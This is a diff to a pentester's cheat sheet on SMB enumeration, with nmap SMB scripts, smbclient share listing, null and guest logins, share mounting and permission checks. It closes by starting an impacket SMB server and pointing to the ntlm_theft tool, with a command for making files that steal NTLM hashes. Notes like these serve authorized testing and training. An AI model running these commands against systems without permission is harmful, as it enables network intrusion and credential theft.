@@ -1,9 +1,11 @@
 nmap 192.168.X.X --script=smb-enum*
 nmap 192.168.X.X --script=smb-vuln*
 nmap 192.168.X.X --script=smb-os*
+nmap --script smb-enum-shares -p 139,445 $ip
+nmap -v -p 139,445 --script smb-os-discovery $ip
 
-#SHARES
-# Will list all shares
+
+#LIST SHARES
 smbclient -L \\\\192.168.1.101\\
 
 # if getting error "protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED"
@@ -12,11 +14,29 @@ smbclient -L \\$ip --option='client min protocol=NT1'
 # List all files recursly
 smbclient //HOST/PATH -c 'recurse;ls'
 
-nmap --script smb-enum-shares -p 139,445 $ip
-nmap -v -p 139,445 --script smb-os-discovery $ip
 
 #SCAN FOR SHARES
 sudo nbtscan -r 192.168.50.0/24
 
 #from windows
 net view \\dc01 /all
+
+
+#Null/Guest SMB
+smbclient -U '%' -L //<DC IP>
+smbclient -U 'guest%' -L //
+
+
+#MOUNT SHARE LOCALLY
+sudo mount -t cifs -o 'user=guest' //IP/share /mnt/share
+ls /mnt/share -laR #recurse listing of all dirs
+
+#Check permissions on share
+smbcacls --no-pass //IP/share dir
+
+#create smb server 
+sudo impacket-smbserver kali . -smb2support
+
+#STEAL NTLM HASHES BY UPLOAD TO smbserver
+https://github.com/Greenwolf/ntlm_theft
+# python3 ntlm_theft.py -g all -s 127.0.0.1 -f test
